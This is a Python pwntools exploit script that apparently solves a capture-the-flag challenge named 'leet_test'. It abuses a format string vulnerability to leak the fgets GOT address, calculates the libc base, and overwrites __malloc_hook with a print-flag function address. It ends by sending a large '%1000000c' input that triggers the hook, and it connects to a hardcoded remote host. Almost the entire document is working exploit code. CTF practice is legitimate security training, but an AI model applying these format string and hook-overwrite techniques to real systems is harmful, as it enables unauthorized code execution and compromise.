#Format String
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

'''

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def detect(io):
        io.sendline('%p.'*80)
        buf = io.recvuntil('Sorry! You aren\'t 1337 enough :(').split('\n')[1].split('.')
        for i in range(len(buf)):
                print str(i+1)+' : '+buf[i]

elf = ELF('./leet_test')
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so')

#io = process('./leet_test')
ip, port = '167.99.195.233', 30016
io = remote(ip, port)

#detect(io)   #offset == 10
#refer to Format

io.recvuntil('Please enter your name: ')
io.sendline('AAA%11$s' + p64(elf.got.fgets))
buf_addr = io.recvuntil('@@@').split('@@@')[0].split('AAA')[1]
print hex(u64(buf_addr.ljust(8, '\x00')))
fgets_addr = u64(buf_addr.ljust(8, '\x00'))

libc_base = fgets_addr - libc.sym.fgets
libc.address = libc_base

print_flag = 0x4013cb
payload = fmtstr_payload(10, {libc.sym.__malloc_hook : print_flag})

io.recvuntil('Please enter your name: ')
io.sendline(payload)
io.recv()
io.recvuntil('Please enter your name: ')
io.sendline('%1000000c') #trigger allocate large space and call __malloc_hook()
print io.recv()

